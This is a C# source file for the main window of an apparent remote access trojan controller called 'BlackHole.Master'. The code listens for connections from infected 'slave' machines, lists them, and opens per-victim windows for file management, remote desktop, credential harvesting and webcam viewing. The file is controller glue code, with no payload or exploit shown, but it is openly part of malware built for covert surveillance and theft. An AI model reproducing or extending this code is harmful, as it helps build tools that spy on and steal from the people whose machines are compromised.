using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Extentions;
using BlackHole.Master.Model;

namespace BlackHole.Master
{
    /// <summary>
    /// Logique d'interaction pour MainWindow.xaml
    /// </summary>
    public partial class MainWindow : IEventListener<SlaveEvent, Slave>
    {
        /// <summary>
        /// 
        /// </summary>
        private MainWindow()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        public static MainWindow Instance { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        private List<Window> m_childWindows;

        /// <summary>
        /// 
        /// </summary>
        static MainWindow()
        {
            Instance = new MainWindow();
        }

        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<Slave> ViewModelSlaves { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        public SlaveMonitorModel ViewModelMonitor { get; private set; }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnLoaded(object sender, RoutedEventArgs e)
        {
            Initialize();
        }

        /// <summary>
        /// 
        /// </summary>
        private void Initialize()
        {
            m_childWindows = new List<Window>();

            SlavesList.DataContext = ViewModelSlaves = new ViewModelCollection<Slave>();
            SlaveStatusBar.DataContext = ViewModelMonitor = new SlaveMonitorModel();

            Slave.SlaveEvents.Subscribe(this);
            NetworkService.Instance.Start();

            ViewModelMonitor.SetListeningState("Listening");

            AddInfoMessage("NetworkService running...");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="color"></param>
        /// <param name="message"></param>
        public async Task AddConsoleMessage(Brush color, string message)
        {
            await this.ExecuteInDispatcher(() =>
            {
                var textRange = new TextRange(Console.Document.ContentEnd, Console.Document.ContentEnd);
                textRange.Text = message + '\u2028';
                textRange.ApplyPropertyValue(TextElement.ForegroundProperty, color);
                Console.ScrollToEnd();
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async void AddInfoMessage(string message) => await AddConsoleMessage(Brushes.Green, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public async void AddErrorMessage(string message) => await AddConsoleMessage(Brushes.Red, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public async void OnEvent(SlaveEvent ev)
        {
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType) ev.EventType)
                {
                    case SlaveEventType.Connected:
                        {
                            ViewModelSlaves.AddItem(ev.Source);
                            UpdateOnlineSlaves();
                            AddInfoMessage($"connected slave={ev.Source}");
                        }
                        break;
                    case SlaveEventType.Disconnected:
                        {
                            ViewModelSlaves.RemoveItem(ev.Source);
                            UpdateOnlineSlaves();
                            CloseSlaveWindows(ev.Source.Id);
                            AddInfoMessage($"disconnected slave={ev.Source}");
                        }
                        break;
                    case SlaveEventType.IncommingMessage:
                        {
                            //if (!(ev.Data is PongMessage))
                                //AddInfoMessage($"received id={ev.Source.Id} slave={ev.Source.UserName} message={ev.Data.GetType().Name}");
                        
                        }
                        break;
                }
            });
        }

        /// <summary>
        /// 
        /// </summary>
        private void UpdateOnlineSlaves() => ViewModelMonitor.SetOnlineSlaves(ViewModelSlaves.Items.Count);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnClosing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            NetworkService.Instance.Stop();
            m_childWindows.ForEach(async window => await window.ExecuteInDispatcher(window.Close));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OpenFileManager(object sender, RoutedEventArgs e) =>
            OpenSlaveWindowIfSelected(slave => new FileManagerWindow(slave));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OpenRemoteDesktop(object sender, RoutedEventArgs e) =>
            OpenSlaveWindowIfSelected(slave => new RemoteDesktopWindow(slave));

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="creator"></param>
        private void OpenSlaveWindowIfSelected<T>(Func<Slave, T> creator) where T : SlaveWindow
        {
            if (SlavesList.SelectedItem != null)
                RegisterOrOpenChildWindow(creator((Slave)SlavesList.SelectedItem));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slaveId"></param>
        private List<SlaveWindow> FindSlaveWindows(int slaveId) =>
            m_childWindows.OfType<SlaveWindow>().Where(window => window.Slave.Id == slaveId).ToList();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slaveId"></param>
        private void CloseSlaveWindows(int slaveId) =>
           FindSlaveWindows(slaveId).ForEach(async window => await window.ExecuteInDispatcher(window.Close));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="window"></param>
        private async void RegisterOrOpenChildWindow<T>(T window) where T : SlaveWindow
        {
            // focus the existing window
            var existingWindow = m_childWindows
                .OfType<T>()
                .FirstOrDefault(w => w.Slave.Id == window.Slave.Id);
            if (existingWindow != null)
            {
                await existingWindow.ExecuteInDispatcher(() => existingWindow.Focus());
                return;
            }

            // hook the closing so we remove 
            window.Closed += async (s, args) =>
            {
                await this.ExecuteInDispatcher(() =>
                {
                    Slave.SlaveEvents.Unsubscribe(window);
                    m_childWindows.Remove(window);
                });
            };

            // register the slave window to the events of the slave
            Slave.SlaveEvents.Subscribe(ev =>
            {
                // should be our slave
                if (ev.Source.Id != window.Slave.Id)
                    return false;

                var statusMessage = ev.Data as StatusUpdateMessage;
                if (statusMessage != null)
                    if (statusMessage.WindowId != -1 && statusMessage.WindowId != window.Id)
                        return false;

                return true;
            }, window);

            m_childWindows.Add(window);

            // finally, open up the window
            window.Show();
        }

        private void OpenCredentialsWindow(object sender, RoutedEventArgs e) =>
            OpenSlaveWindowIfSelected(slave => new CredentialsWindow(slave));

        private void OpenWebcamWindow(object sender, RoutedEventArgs e) =>
            OpenSlaveWindowIfSelected(slave => new WebcamWindow(slave));
    }
}
